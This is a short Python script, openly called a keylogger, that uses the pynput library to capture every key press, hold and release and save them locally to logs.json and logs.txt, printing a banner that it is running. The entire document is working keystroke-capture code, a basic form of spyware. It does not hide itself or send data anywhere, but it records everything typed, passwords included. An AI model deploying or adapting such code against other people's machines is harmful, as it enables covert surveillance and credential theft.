from pynput import keyboard
import json

key_list = []
x = False #Value to determine if held
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
            #f'Key {key} pressed'
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
            #f'Key {key} pressed'
        )
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
        #f'Key {key} released'
    )
    if x == True:
        x = False
    update_json_file(key_list)
    
    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

print("[+] Running Keylogger Successfuly!\n[!] Saving the Pressed, Held and Released key logs in 'logs.json\n[!] Saving only the Released key logs in 'logs.txt'")

with keyboard.Listener(
        on_press = on_press,
        on_release = on_release) as listener:
    listener.join()

                
